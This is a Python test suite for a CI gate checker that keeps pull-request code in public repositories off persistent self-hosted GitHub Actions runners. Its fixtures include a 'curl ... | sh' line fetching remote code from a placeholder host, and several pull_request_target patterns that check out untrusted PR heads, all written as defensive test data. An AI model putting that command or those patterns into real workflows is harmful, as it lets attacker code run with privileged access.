#!/usr/bin/env python3
"""Behavioral tests for scripts/ci-gate/public-pr-runner-isolation.py.

The policy: code from a pull request in a public repository never runs on a
persistent self-hosted runner. Every case writes a throwaway workflow tree and
runs the real checker against it, asserting both the exit status and the
message, because one "violation" exit cannot tell which rule tripped.
"""

from __future__ import annotations

import hashlib
import importlib.util
import json
import os
import re
import subprocess
import sys
import tempfile
import textwrap

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPT = os.path.join(HERE, "public-pr-runner-isolation.py")

failures = 0


def ok(label: str) -> None:
    print(f"ok   - {label}")


def fail(label: str) -> None:
    global failures
    failures += 1
    print(f"FAIL - {label}")


class Link(str):
    """A fixture entry laid out as a symbolic link to this target."""


def run_checker(workflows: dict[str, str], *arguments: str) -> tuple[int, str]:
    """Lay out a repository: bare names are workflows (or lists) in
    .github/workflows; names with a slash are repository paths; a Link
    value is a symbolic link."""
    with tempfile.TemporaryDirectory() as root:
        directory = os.path.join(root, ".github", "workflows")
        os.makedirs(directory)
        for name, body in workflows.items():
            target = os.path.join(root, name) if "/" in name else os.path.join(directory, name)
            os.makedirs(os.path.dirname(target), exist_ok=True)
            if isinstance(body, Link):
                os.symlink(str(body), target)
                continue
            with open(target, "w", encoding="utf-8") as handle:
                handle.write(textwrap.dedent(body))
        arguments = tuple(argument.replace("{dir}", directory) for argument in arguments)
        completed = subprocess.run(
            [sys.executable, SCRIPT, *arguments, directory],
            capture_output=True,
            text=True,
        )
    return completed.returncode, completed.stdout + completed.stderr


def expect(
    workflows: dict[str, str],
    code: int,
    fragments: tuple[str, ...],
    label: str,
    *arguments: str,
) -> None:
    actual, output = run_checker(workflows, *arguments)
    missing = [fragment for fragment in fragments if fragment not in output]
    if actual != code or missing:
        fail(f"{label} (expected exit {code} with {missing or fragments}, got {actual}: {output.strip()})")
    else:
        ok(label)


expect(
    {
        "ci.yml": """
            on: pull_request
            jobs:
              test:
                runs-on: ${{ fromJSON(vars.CI_LANE_TRUSTED || vars.CI_LANE_FALLBACK || '["ubuntu-24.04"]') }}
                steps:
                  - run: 'true'
        """,
    },
    1,
    ("ci.yml", "test", "self-hosted"),
    "a pull_request job on the trusted lane is a violation",
)

expect(
    {
        "ci.yml": """
            on: [pull_request, push]
            jobs:
              publish:
                if: github.event_name == 'push'
                runs-on: ${{ fromJSON(vars.CI_LANE_TRUSTED || vars.CI_LANE_FALLBACK || '["ubuntu-24.04"]') }}
                steps:
                  - run: 'true'
        """,
    },
    0,
    ("clean",),
    "a job whose condition cannot hold on pull_request is not reachable",
)

expect(
    {
        "ci.yml": """
            on: pull_request
            jobs:
              admission:
                if: github.repository == 'Verjson/elsewhere'
                runs-on: ubuntu-24.04
                steps:
                  - run: 'true'
              build:
                needs: admission
                if: ${{ !github.event.pull_request.draft }}
                runs-on: ${{ fromJSON(vars.CI_LANE_TRUSTED || vars.CI_LANE_FALLBACK || '["ubuntu-24.04"]') }}
                steps:
                  - run: 'true'
        """,
    },
    0,
    ("clean",),
    "a job needing a skipped job without a status function is not reachable",
)

expect(
    {
        "caller.yml": """
            on: pull_request
            jobs:
              lint:
                uses: ./.github/workflows/lint.yml
        """,
        "lint.yml": """
            on: workflow_call
            jobs:
              lint:
                runs-on: ${{ fromJSON(vars.CI_RUNNER_FASTLANE || vars.CI_LANE_UNTRUSTED || '["ubuntu-24.04"]') }}
                steps:
                  - run: 'true'
        """,
    },
    1,
    ("caller.yml", "lint.yml", "lint"),
    "a local reusable workflow called on pull_request is checked through its caller",
)

expect(
    {
        "caller.yml": """
            on: pull_request
            jobs:
              build:
                uses: ./.github/workflows/build.yml
                with:
                  runner: ${{ vars.CI_RUNNER_DEFAULT }}
        """,
        "build.yml": """
            on:
              workflow_call:
                inputs:
                  runner:
                    type: string
                    default: ''
            jobs:
              build:
                runs-on: ${{ inputs.runner != '' && fromJSON(inputs.runner) || fromJSON(vars.CI_LANE_UNTRUSTED || '["ubuntu-24.04"]') }}
                steps:
                  - run: 'true'
        """,
    },
    1,
    ("build.yml", "inputs"),
    "a reusable workflow honoring a caller runner input on pull_request is a violation",
)

def digest(selector) -> str:
    """The pending-row key: SHA-256 of the job's runs-on value as canonical JSON."""
    canonical = json.dumps(selector, sort_keys=True, separators=(",", ":"), ensure_ascii=False)
    return "sha256:" + hashlib.sha256(canonical.encode("utf-8")).hexdigest()


TRUSTED_SELECTOR = """${{ fromJSON(vars.CI_LANE_TRUSTED || vars.CI_LANE_FALLBACK || '["ubuntu-24.04"]') }}"""
# No pull_request job may be pending (round-4 finding 6): the five that waited
# on #1826 now select the ephemeral lane, so the checker refuses any
# pull_request row, even one that names a former backlog job with its digest.
TRUSTED_LANE_PR_JOB = """
    on: pull_request
    jobs:
      actionlint:
        runs-on: ${{ fromJSON(vars.CI_LANE_TRUSTED || vars.CI_LANE_FALLBACK || '["ubuntu-24.04"]') }}
        steps:
          - run: 'true'
"""
expect(
    {
        "actionlint.yml": TRUSTED_LANE_PR_JOB,
        "pending.tsv": f"actionlint.yml\tactionlint\t{digest(TRUSTED_SELECTOR)}\tselector pinned elsewhere\n",
    },
    2,
    ("UNDETERMINED", "actionlint.yml job 'actionlint' is not in the frozen backlog"),
    "a pull_request job cannot be listed as pending, even a former backlog job",
    "--pending",
    "{dir}/pending.tsv",
)

expect(
    {
        "ci.yml": """
            on: pull_request
            jobs:
              test:
                if: ${{ !contains(github.event.pull_request.labels.*.name, 'skip-ci') }}
                runs-on: ${{ fromJSON(vars.CI_LANE_TRUSTED || vars.CI_LANE_FALLBACK || '["ubuntu-24.04"]') }}
                steps:
                  - run: 'true'
        """,
    },
    1,
    ("ci.yml", "test", "self-hosted"),
    "an object filter in a condition is parsed rather than left undetermined",
)

# ---------------------------------------------------------------------------
# Hardening: failure modes and the routing shapes the live tree relies on. Each
# was proven to fail under a targeted mutation of the checker (see #1827).
# ---------------------------------------------------------------------------


def pull_request_job(runs_on: str, extra: str = "") -> dict[str, str]:
    return {
        "ci.yml": f"""
            on: pull_request
            jobs:
              test:{extra}
                runs-on: {runs_on}
                steps:
                  - run: 'true'
        """,
    }


expect(
    pull_request_job("""${{ fromJSON(vars.CI_LANE_UNTRUSTED || vars.CI_LANE_FALLBACK || '["ubuntu-24.04"]') }}"""),
    1,
    ("vars.CI_LANE_UNTRUSTED=<unset>", "vars.CI_LANE_FALLBACK="),
    "an untrusted lane that falls back to CI_LANE_FALLBACK can reach the persistent pool",
)
expect(
    pull_request_job("""${{ fromJSON(vars.CI_LANE_UNTRUSTED || '["ubuntu-24.04"]') }}"""),
    0,
    ("clean",),
    "the untrusted lane with a hosted tail is ephemeral whether or not it is set",
)
expect(
    pull_request_job("""${{ fromJSON(vars['CI_LANE_TRUSTED'] || '["ubuntu-24.04"]') }}"""),
    1,
    ("vars.CI_LANE_TRUSTED=",),
    "a bracket dereference of a persistent variable is enumerated like a dotted one",
)
expect(
    pull_request_job("[self-hosted, '${{ inputs.label }}']"),
    1,
    ("self-hosted",),
    "a literal self-hosted label in a runs-on list is a violation",
)
expect(
    pull_request_job("{group: DigitalOcean}"),
    1,
    ("group",),
    "a runner-group selector is never treated as ephemeral",
)
expect(
    pull_request_job("ubuntu-24.04"),
    0,
    ("clean",),
    "a literal GitHub-hosted image is ephemeral",
)
expect(
    pull_request_job("runner-${{ github.event_name }}"),
    2,
    ("UNDETERMINED", "interpolates"),
    "a selector built by string interpolation is undetermined, never clean",
)
expect(
    pull_request_job("${{ matrix.os }}"),
    2,
    ("UNDETERMINED", "cannot resolve"),
    "a selector the checker cannot resolve is undetermined, never clean",
)
expect(
    pull_request_job("""${{ fromJSON(vars.CI_LANE_TRUSTED ||| '["ubuntu-24.04"]') }}"""),
    2,
    ("UNDETERMINED",),
    "a malformed expression is undetermined, never clean",
)
expect(
    {
        "ci.yml": """
            on: pull_request
            jobs:
              remote:
                uses: Verjson/.github/.github/workflows/node-ci.yml@0123456789abcdef0123456789abcdef01234567
        """,
    },
    2,
    ("UNDETERMINED", "cannot read"),
    "a reachable remote reusable workflow is undetermined, never clean",
)
expect(
    {
        "ci.yml": """
            on: pull_request
            jobs:
              admission:
                if: github.repository == 'Verjson/elsewhere'
                runs-on: ubuntu-24.04
                steps:
                  - run: 'true'
              report:
                needs: admission
                if: always()
                runs-on: ${{ fromJSON(vars.CI_LANE_TRUSTED || '["ubuntu-24.04"]') }}
                steps:
                  - run: 'true'
        """,
    },
    1,
    ("report",),
    "always() keeps a job reachable behind a skipped dependency",
)
expect(
    {
        "ci.yml": """
            on: push
            jobs:
              test:
                runs-on: [self-hosted, general]
                steps:
                  - run: 'true'
        """,
    },
    0,
    ("clean",),
    "a workflow without a pull_request trigger is outside the policy",
)
expect({}, 2, ("UNDETERMINED", "no workflow files"), "an empty workflow directory is undetermined")
expect(
    {**pull_request_job("ubuntu-24.04"), "pending.tsv": f"ci.yml\ttest\t{digest('ubuntu-24.04')}\n"},
    2,
    ("UNDETERMINED", "path<TAB>job<TAB>backlog digest<TAB>reason"),
    "a pending row without a reason is rejected",
    "--pending",
    "{dir}/pending.tsv",
)
expect(
    {**pull_request_job("ubuntu-24.04"), "pending.tsv": "ci.yml\ttest\tsha256:abc\treason\n"},
    2,
    ("UNDETERMINED", "backlog digest"),
    "a pending row with a malformed backlog digest is rejected",
    "--pending",
    "{dir}/pending.tsv",
)


# ---------------------------------------------------------------------------
# Review of #1827 (blocker): a reference compared against a literal must be
# tried AS that literal, or any gate keyed on a value outside the fixed
# candidate set reads as unreachable and the job is reported clean.
# ---------------------------------------------------------------------------
expect(
    {
        "ci.yml": """
            on: pull_request
            jobs:
              heavy:
                if: vars.ENABLE_HEAVY == 'true'
                runs-on: [self-hosted, general]
                steps:
                  - run: 'true'
        """,
    },
    1,
    ("heavy", "vars.ENABLE_HEAVY=true"),
    "a variable compared to a literal in a condition is tried as that literal",
)
expect(
    pull_request_job(
        """${{ vars.LANE_MODE == 'shared' && fromJSON('["self-hosted","general"]') || 'ubuntu-24.04' }}"""
    ),
    1,
    ("vars.LANE_MODE=shared",),
    "a variable compared to a literal in a selector is tried as that literal",
)
expect(
    {
        "caller.yml": """
            on: pull_request
            jobs:
              build:
                uses: ./.github/workflows/build.yml
                with:
                  lane: ${{ github.head_ref }}
        """,
        "build.yml": """
            on:
              workflow_call:
                inputs:
                  lane:
                    type: string
                    default: ''
            jobs:
              build:
                runs-on: ${{ inputs.lane == 'shared' && fromJSON('["self-hosted","general"]') || 'ubuntu-24.04' }}
                steps:
                  - run: 'true'
        """,
    },
    1,
    ("build.yml", "inputs.lane=shared"),
    "an attacker-shaped caller input compared to a literal is tried as that literal",
)
expect(
    pull_request_job(
        """${{ format('{0}', vars.LANE_MODE) == 'shared' && fromJSON('["self-hosted","general"]') || 'ubuntu-24.04' }}"""
    ),
    1,
    ("self-hosted",),
    "a comparison the checker cannot enumerate exactly is evaluated both ways",
)


# Only standard GitHub-hosted image names are ephemeral. A self-hosted runner
# can carry any custom label, so a look-alike must not pass as hosted.
for label in ("ubuntu-gpu-selfhosted", "ubuntu-24.04-large", "macos-14-xlarge",
              "windows-gpu", "ubuntu-２4.04", "Ubuntu-24.04x", '"ubuntu-24.04\\n"'):
    expect(
        pull_request_job(label),
        1,
        ("non-ephemeral",),
        f"look-alike label {label!r} is not treated as a standard hosted image",
    )
for label in ("ubuntu-latest", "ubuntu-22.04", "ubuntu-24.04-arm", "windows-latest",
              "windows-2025", "windows-11-arm", "macos-latest", "macos-15", "macos-15-intel"):
    expect(
        pull_request_job(label),
        0,
        ("clean",),
        f"standard hosted image {label!r} is ephemeral",
    )


# ---------------------------------------------------------------------------
# pull_request_target runs the BASE workflow with a privileged token, so it is
# dangerous exactly when a job materializes the pull request's head. Those jobs
# are held to the same placement rule; base-only jobs are not.
# ---------------------------------------------------------------------------


# Under privileged events head detection is a diagnostic: every persistent job
# fails unlisted, and these fixtures pin what the diagnostic reports.
REVIEW_REQUIRED = "requires a reviewed entry"
HEAD_DIAG = "head detection: materializes the pull request head"
NO_HEAD_DIAG = "head detection: no known head-materializing pattern"
UNDETERMINED_DIAG = "head detection: undetermined"


def target_job(steps: str, runs_on: str = TRUSTED_SELECTOR) -> dict[str, str]:
    return {
        "target.yml": f"""
            on: pull_request_target
            jobs:
              review:
                runs-on: {runs_on}
                steps:
{textwrap.indent(textwrap.dedent(steps), " " * 18)}
        """,
    }


expect(
    target_job("""
        - uses: actions/checkout@v4
          with:
            ref: ${{ github.event.pull_request.head.sha }}
        - run: make test
    """),
    1,
    ("target.yml [pull_request_target]", "review", HEAD_DIAG, "has no sparse-checkout list"),
    "a pull_request_target job that checks out the head is held to the placement rule",
)
expect(
    target_job("""
        - run: gh pr checkout ${{ github.event.pull_request.number }} && make test
    """),
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "a pull_request_target job running gh pr checkout is held to the placement rule",
)
expect(
    target_job("""
        - uses: actions/checkout@v4
          with:
            ref: ${{ env.CANDIDATE }}
    """),
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "a pull_request_target checkout through an indirection is treated as head-capable",
)
expect(
    target_job("""
        - env:
            HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          run: git fetch --depth=1 origin "$HEAD_SHA" && git checkout FETCH_HEAD
    """),
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "a pull_request_target git fetch of a head-derived value is held to the placement rule",
)
expect(
    target_job("""
        - uses: actions/checkout@v4
          with:
            ref: ${{ github.sha }}
        - env:
            HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          run: gh api "repos/$GITHUB_REPOSITORY/commits/$HEAD_SHA/check-runs"
    """),
    1,
    (NO_HEAD_DIAG, REVIEW_REQUIRED),
    "a base-code pull_request_target job on a persistent runner still requires review",
)
expect(
    target_job(
        """
        - uses: actions/checkout@v4
          with:
            ref: ${{ github.event.pull_request.head.sha }}
        """,
        runs_on="ubuntu-24.04",
    ),
    0,
    ("clean",),
    "a pull_request_target head checkout on a hosted image is clean",
)

REVIEWED_REMOTE = "Verjson/.github/.github/workflows/app-key-environment.yml@ebe23fafbdb77dd2cca6f1862d932fde881b80d7"


def remote_target_call(workflow: str, job: str, uses: str) -> dict[str, str]:
    return {
        workflow: f"""
            on: pull_request_target
            jobs:
              {job}:
                uses: {uses}
        """,
    }


expect(
    remote_target_call("target.yml", "arm", REVIEWED_REMOTE),
    1,
    ("target.yml [pull_request_target]: job 'arm'", "remote callee", REVIEW_REQUIRED),
    "an unlisted remote callee under pull_request_target requires review",
)
expect(
    target_job("""
        - run: git fetch origin "+refs/pull/1/merge" && git checkout FETCH_HEAD
    """),
    1,
    ("[pull_request_target]", HEAD_DIAG),
    "a pull_request_target fetch of a refs/pull refspec is held to the placement rule",
)

expect(
    pull_request_job(
        """${{ vars.LANE_LEVEL > 2 && fromJSON('["self-hosted","general"]') || 'ubuntu-24.04' }}"""
    ),
    1,
    ("self-hosted",),
    "an ordering comparison over a variable is evaluated both ways",
)
expect(
    target_job("""
        - uses: actions/checkout@v4
          with:
            ref: refs/pull/1/merge
    """),
    1,
    ("[pull_request_target]", HEAD_DIAG),
    "a pull_request_target checkout of a literal refs/pull ref is head-capable",
)


# Re-review of #1827 at 7299a2f4: four head-materializing shapes passed clean.
expect(
    {
        "target.yml": f"""
            on: pull_request_target
            env:
              HEAD_SHA: ${{{{ github.event.pull_request.head.sha }}}}
            jobs:
              review:
                runs-on: {TRUSTED_SELECTOR}
                steps:
                  - run: git fetch origin "$HEAD_SHA" && git checkout "$HEAD_SHA"
        """,
    },
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "(a) a workflow-level env head value fetched by git is head-capable",
)
expect(
    target_job("""
        - run: gh pr diff ${{ github.event.number }} | git apply
    """),
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "(b) gh pr diff piped into git apply is head-capable",
)
expect(
    target_job("""
        - run: curl -sSL "https://api.github.com/repos/o/r/tarball/${{ github.event.pull_request.head.sha }}" | tar xz
    """),
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "(c) a download of a head tarball is head-capable",
)
expect(
    target_job("""
        - uses: some-org/fetch-source@v1
          with:
            revision: ${{ github.event.pull_request.head.sha }}
    """),
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "(d) a non-checkout action given a head value is head-capable",
)
expect(
    target_job("""
        - env:
            CANDIDATE: ${{ github.event.pull_request.head.sha }}
          run: ./tools/materialize "$CANDIDATE"
    """),
    1,
    (UNDETERMINED_DIAG, REVIEW_REQUIRED),
    "a head value handed to an unreadable program is reported undetermined and requires review",
)


INLINE_PROGRAM = """
        - env:
            PR_NUMBER: ${{{{ github.event.pull_request.number }}}}
          run: |
            program="$RUNNER_TEMP/inline-tool.py"
            cat >"$program" <<'PY'
            import subprocess
            {body}
            PY
            python3 -I "$program" "$PR_NUMBER"
"""
expect(
    target_job(INLINE_PROGRAM.format(body='subprocess.run(["gh", "api", "repos/o/r/pulls/1"], check=True)')),
    1,
    (NO_HEAD_DIAG, REVIEW_REQUIRED),
    "a program authored inline by the workflow is read for the diagnostic, not left ambiguous",
)
expect(
    target_job(INLINE_PROGRAM.format(body='subprocess.run(["git", "fetch", "origin", "pull/1/head"], check=True)')),
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "an inline-authored program that runs git fetch on a head value is head-capable",
)

expect(
    {
        "target.yml": f"""
            on: pull_request_target
            env:
              CANDIDATE: ${{{{ github.event.pull_request.head.sha }}}}
            jobs:
              review:
                runs-on: {TRUSTED_SELECTOR}
                steps:
                  - run: ./tools/materialize "$CANDIDATE"
        """,
    },
    1,
    (UNDETERMINED_DIAG, REVIEW_REQUIRED),
    "a workflow-level head value handed by name to an unreadable program is reported undetermined",
)
expect(
    target_job("""
        - run: gh pr diff 1 > change.patch && patch -p1 < change.patch
    """),
    1,
    ("[pull_request_target]", "review", HEAD_DIAG),
    "gh pr diff materializes the head even without a git command",
)


# ---------------------------------------------------------------------------
# Re-review of #1827 at 2f48d335: head detection cannot be made complete, so
# under pull_request_target, workflow_run and issue_comment any job that can
# land on a persistent runner fails unless a reviewed entry, keyed to a digest
# of its full content and inherited workflow settings, lists it. The reviewer's
# repros (g1-g7) must fail unlisted, whatever the diagnostics conclude.
# ---------------------------------------------------------------------------
REVIEWER_REPROS = {
    "g1 jq event payload into GITHUB_ENV then git fetch": """
        - run: echo "HEAD=$(jq -r .pull_request.head.sha "$GITHUB_EVENT_PATH")" >> "$GITHUB_ENV"
        - run: git fetch origin "$HEAD" && git checkout "$HEAD"
    """,
    "g2 jq into GITHUB_OUTPUT then git worktree add": """
        - id: head
          run: echo "sha=$(jq -r .pull_request.head.sha "$GITHUB_EVENT_PATH")" >> "$GITHUB_OUTPUT"
        - run: git -C repo worktree add ../pr "${{ steps.head.outputs.sha }}"
    """,
    "g3 github-script tarball download": """
        - uses: actions/github-script@v7
          with:
            script: |
              const pr = context.payload.pull_request;
              await github.rest.repos.downloadTarballArchive({owner: pr.head.repo.owner.login, repo: pr.head.repo.name, ref: pr.head.sha});
    """,
    "g4 git --git-dir fetch of refs/pull": """
        - env:
            PR: ${{ github.event.pull_request.number }}
          run: git --git-dir=.git fetch origin "refs/pull/$PR/head"
    """,
    "g5 PR number from the event file": """
        - run: n=$(jq .number "$GITHUB_EVENT_PATH"); git fetch origin "pull/$n/head"
    """,
    "g7 gh repo clone of the head repository": """
        - run: gh repo clone ${{ github.event.pull_request.head.repo.full_name }}
    """,
}
for label, steps in REVIEWER_REPROS.items():
    expect(
        target_job(steps),
        1,
        ("target.yml [pull_request_target]", "review", REVIEW_REQUIRED),
        f"{label}: an unlisted pull_request_target job on a persistent runner fails",
    )

for event in ("workflow_run", "issue_comment"):
    expect(
        {
            "privileged.yml": f"""
                on: {event}
                jobs:
                  review:
                    runs-on: {TRUSTED_SELECTOR}
                    steps:
                      - run: 'true'
            """,
        },
        1,
        (f"privileged.yml [{event}]", REVIEW_REQUIRED),
        f"an unlisted {event} job on a persistent runner fails",
    )


# ---------------------------------------------------------------------------
# The reviewed list: path<TAB>job<TAB>review digest<TAB>justification. The
# digest is read from the checker's own VIOLATION line, which is how an
# operator obtains it after reviewing the job.
# ---------------------------------------------------------------------------
REVIEW_DIGEST_LINE = r"VIOLATION: {path}: job '{job}': .*?review digest (sha256:[0-9a-f]{{64}})"


def review_row(workflows: dict[str, str], path: str, job: str, why: str = "reviewed for the fixture") -> str:
    code, output = run_checker(workflows)
    match = re.search(REVIEW_DIGEST_LINE.format(path=re.escape(path), job=re.escape(job)), output)
    if code != 1 or not match:
        raise AssertionError(f"no review digest for {path} {job}: {output}")
    return f"{path}\t{job}\t{match.group(1)}\t{why}\n"


def with_review(workflows: dict[str, str], rows: str) -> dict[str, str]:
    return {**workflows, "reviewed.tsv": rows}


REVIEWED_ARGS = ("--reviewed", "{dir}/reviewed.tsv")
LISTED = target_job("""
    - uses: actions/checkout@v4
      with:
        ref: ${{ github.sha }}
        sparse-checkout: .github/workflows/target.yml
        sparse-checkout-cone-mode: false
    - run: make lint
""")
LISTED_ROW = review_row(LISTED, "target.yml [pull_request_target]", "review")

expect(
    with_review(LISTED, LISTED_ROW),
    0,
    ("REVIEWED: target.yml [pull_request_target]: job 'review' [reviewed for the fixture]", "clean"),
    "a reviewed privileged job with an unchanged digest passes",
    *REVIEWED_ARGS,
)
expect(
    with_review({"target.yml": LISTED["target.yml"].replace("make lint", "make lint!")}, LISTED_ROW),
    1,
    ("STALE REVIEWED: target.yml [pull_request_target]: job 'review': content changed",),
    "a one-character edit to a reviewed job turns its entry stale",
    *REVIEWED_ARGS,
)
INHERITED = {
    "target.yml": LISTED["target.yml"].replace(
        "on: pull_request_target\n", "on: pull_request_target\n            env:\n              MODE: safe\n", 1
    )
}
INHERITED_ROW = review_row(INHERITED, "target.yml [pull_request_target]", "review")
expect(
    with_review({"target.yml": INHERITED["target.yml"].replace("MODE: safe", "MODE: open")}, INHERITED_ROW),
    1,
    ("STALE REVIEWED", "content changed"),
    "an edit to inherited workflow env turns the entry stale",
    *REVIEWED_ARGS,
)
expect(
    with_review(
        {"target.yml": INHERITED["target.yml"].replace("MODE: safe", "MODE: safe\n            permissions:\n              contents: write")},
        INHERITED_ROW,
    ),
    1,
    ("STALE REVIEWED", "content changed"),
    "an edit to inherited workflow permissions turns the entry stale",
    *REVIEWED_ARGS,
)
TWINS = {
    "target.yml": f"""
        on: pull_request_target
        jobs:
          first:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - run: make lint
          second:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - run: make lint
    """,
}
expect(
    with_review(TWINS, review_row(TWINS, "target.yml [pull_request_target]", "first")),
    1,
    ("VIOLATION: target.yml [pull_request_target]: job 'second'", REVIEW_REQUIRED),
    "an entry never covers an identical job with a different id",
    *REVIEWED_ARGS,
)
expect(
    with_review(target_job("- run: make lint", runs_on="ubuntu-24.04"), ""),
    0,
    ("clean",),
    "a privileged job that resolves only to a hosted image passes unlisted",
    *REVIEWED_ARGS,
)
expect(
    with_review(target_job("- run: make lint", runs_on="ubuntu-24.04"), LISTED_ROW),
    1,
    ("STALE REVIEWED: target.yml [pull_request_target]: job 'review' no longer needs review",),
    "an entry for a job that no longer needs review is stale",
    *REVIEWED_ARGS,
)
CALLER = {
    "caller.yml": """
        on: pull_request_target
        jobs:
          call:
            uses: ./.github/workflows/callee.yml
            with:
              mode: lint
    """,
    "callee.yml": f"""
        on:
          workflow_call:
            inputs:
              mode:
                type: string
        jobs:
          work:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - run: make "${{{{ inputs.mode }}}}"
    """,
}
CALLEE_PATH = "caller.yml [pull_request_target]:call -> callee.yml"
expect(
    with_review({**CALLER, "caller.yml": CALLER["caller.yml"].replace("mode: lint", "mode: test")},
                review_row(CALLER, CALLEE_PATH, "work")),
    1,
    ("STALE REVIEWED", CALLEE_PATH),
    "an edit to the calling job's with: turns the callee entry stale",
    *REVIEWED_ARGS,
)
expect(
    with_review(LISTED, "target.yml [pull_request_target]\treview\tsha256:abc\twhy\n"),
    2,
    ("UNDETERMINED", "review digest must be sha256"),
    "a reviewed row with a malformed digest is rejected",
    *REVIEWED_ARGS,
)


expect(
    target_job("- run: make lint", runs_on="${{ matrix.os }}"),
    1,
    ("target.yml [pull_request_target]", REVIEW_REQUIRED),
    "a privileged job whose placement cannot be resolved requires review",
)
REMOTE_ROW = review_row(
    remote_target_call("gate-rearm.yml", "app-key-policy", REVIEWED_REMOTE),
    "gate-rearm.yml [pull_request_target]",
    "app-key-policy",
)
expect(
    with_review(remote_target_call("gate-rearm.yml", "app-key-policy", REVIEWED_REMOTE), REMOTE_ROW),
    0,
    ("REVIEWED: gate-rearm.yml [pull_request_target]: job 'app-key-policy'",),
    "a reviewed remote callee at its reviewed SHA passes",
    *REVIEWED_ARGS,
)
expect(
    with_review(
        remote_target_call("gate-rearm.yml", "app-key-policy", REVIEWED_REMOTE.replace("ebe23faf", "1be23faf")),
        REMOTE_ROW,
    ),
    1,
    ("STALE REVIEWED: gate-rearm.yml [pull_request_target]: job 'app-key-policy'",),
    "a reviewed remote callee repinned to another SHA turns stale",
    *REVIEWED_ARGS,
)
expect(
    with_review(
        {
            **remote_target_call("gate-rearm.yml", "app-key-policy", REVIEWED_REMOTE),
            **remote_target_call("other.yml", "app-key-policy", REVIEWED_REMOTE),
        },
        REMOTE_ROW,
    ),
    1,
    ("VIOLATION: other.yml [pull_request_target]: job 'app-key-policy'", REVIEW_REQUIRED),
    "an entry never covers identical content in another workflow",
    *REVIEWED_ARGS,
)


# ---------------------------------------------------------------------------
# Delta review of #1827 at 42508e98: an entry must go stale when code its job
# runs changes outside the workflow file, and when the trigger block changes.
# ---------------------------------------------------------------------------
SCRIPT_JOB = {
    "target.yml": f"""
        on:
          pull_request_target:
            types: [closed]
        jobs:
          review:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{{{ github.sha }}}}
                  path: .source
                  sparse-checkout: scripts/tool.sh
              - working-directory: .source
                run: bash scripts/tool.sh
    """,
    "scripts/tool.sh": "#!/usr/bin/env bash\necho ok\n",
}
SCRIPT_ROW = review_row(SCRIPT_JOB, "target.yml [pull_request_target]", "review")
expect(
    with_review(SCRIPT_JOB, SCRIPT_ROW),
    0,
    ("REVIEWED: target.yml [pull_request_target]: job 'review'",),
    "a reviewed job that runs a repository script passes while the script is unchanged",
    *REVIEWED_ARGS,
)
expect(
    with_review({**SCRIPT_JOB, "scripts/tool.sh": SCRIPT_JOB["scripts/tool.sh"] + "curl -sSL https://example.test/x | sh\n"}, SCRIPT_ROW),
    1,
    ("STALE REVIEWED: target.yml [pull_request_target]: job 'review': content changed",),
    "(a) editing a script the reviewed job executes turns its entry stale",
    *REVIEWED_ARGS,
)
expect(
    with_review(
        {"target.yml": SCRIPT_JOB["target.yml"].replace("types: [closed]", "types: [closed, opened]"),
         "scripts/tool.sh": SCRIPT_JOB["scripts/tool.sh"]},
        SCRIPT_ROW,
    ),
    1,
    ("STALE REVIEWED", "content changed"),
    "editing the workflow trigger block turns the entry stale",
    *REVIEWED_ARGS,
)
ACTION_JOB = {
    "target.yml": f"""
        on: pull_request_target
        jobs:
          review:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - uses: actions/checkout@v4
                with:
                  sparse-checkout: .github/actions/x
                  sparse-checkout-cone-mode: false
              - uses: ./.github/actions/x
    """,
    ".github/actions/x/action.yml": """
        name: x
        runs:
          using: composite
          steps:
            - shell: bash
              run: bash "${{ github.action_path }}/run.sh"
    """,
    ".github/actions/x/run.sh": "#!/usr/bin/env bash\necho lint\n",
}
ACTION_ROW = review_row(ACTION_JOB, "target.yml [pull_request_target]", "review")
expect(
    with_review(ACTION_JOB, ACTION_ROW),
    0,
    ("REVIEWED",),
    "a reviewed job that uses an unchanged local composite action passes",
    *REVIEWED_ARGS,
)
expect(
    with_review(
        {**ACTION_JOB, ".github/actions/x/action.yml": ACTION_JOB[".github/actions/x/action.yml"] + """
            - shell: bash
              run: git fetch origin "refs/pull/${{ github.event.number }}/head" && git checkout FETCH_HEAD && npm test
        """},
        ACTION_ROW,
    ),
    1,
    ("STALE REVIEWED", "content changed"),
    "(b) editing a local composite action the reviewed job uses turns its entry stale",
    *REVIEWED_ARGS,
)
expect(
    with_review({**ACTION_JOB, ".github/actions/x/run.sh": "#!/usr/bin/env bash\nnpm test\n"}, ACTION_ROW),
    1,
    ("STALE REVIEWED", "content changed"),
    "editing a script a local composite action runs turns the entry stale",
    *REVIEWED_ARGS,
)
FLOATING = remote_target_call("gate-rearm.yml", "app-key-policy", REVIEWED_REMOTE.split("@")[0] + "@main")
# The refusal carries no review digest to copy; any well-formed entry for the
# same path and job stands in for "an entry exists".
FLOATING_ROW = REMOTE_ROW
expect(
    with_review(FLOATING, FLOATING_ROW),
    1,
    ("VIOLATION: gate-rearm.yml [pull_request_target]: job 'app-key-policy'", "full 40-hex commit SHA"),
    "(c) a remote callee pinned to a branch is refused even with an entry",
    *REVIEWED_ARGS,
)
DYNAMIC_JOB = target_job("""
    - uses: actions/checkout@v4
      with:
        ref: ${{ github.sha }}
    - run: bash "$TOOL_DIR/run.sh"
""")
DYNAMIC_ROW = review_row(DYNAMIC_JOB, "target.yml [pull_request_target]", "review")
expect(
    with_review(DYNAMIC_JOB, DYNAMIC_ROW),
    1,
    ("VIOLATION: target.yml [pull_request_target]: job 'review'", "unclassifiable", "full checkout", "dynamic:"),
    "a reviewed job whose on-disk bytes cannot be bounded fails without a dynamic: justification",
    *REVIEWED_ARGS,
)
expect(
